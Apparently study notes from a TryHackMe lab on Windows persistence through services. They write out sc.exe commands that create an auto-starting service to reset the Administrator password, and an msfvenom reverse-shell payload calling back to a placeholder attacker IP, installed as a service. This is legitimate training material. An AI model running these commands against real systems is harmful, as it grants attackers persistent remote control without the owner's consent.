We can create and start a service named "THMservice" using the following commands:
```shell-session
sc.exe create {THMservice} binPath= "net user Administrator Passwd123" start= auto
sc.exe start {THMservice}
```

**Note:** 
	There must be a space after each equal sign for the command to work.

The "net user" command will be executed when the service is started, resetting the Administrator's password to `Passwd123`. Notice how the service has been set to start automatically (start= auto), so that it runs without requiring user interaction.

Resetting a user's password works well enough, but we can also create a reverse shell with msfvenom and associate it with the created service. Notice, however, that service executables are unique since they need to implement a particular protocol to be handled by the system. If you want to create an executable that is compatible with Windows services, you can use the `exe-service` format in msfvenom:
```shell-session
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST={ATTACKER_IP} LPORT={port.number} -f exe-service -o {rev-svc.exe}
```
 ![[Pasted image 20240910033314.png]]

Copy the executable to your target system, say in `C:\Windows` and point the service's binPath to it:
```
sc.exe create {THMservice2} binPath= "C:\windows\rev-svc.exe" start= auto
sc.exe start {THMservice2}
```

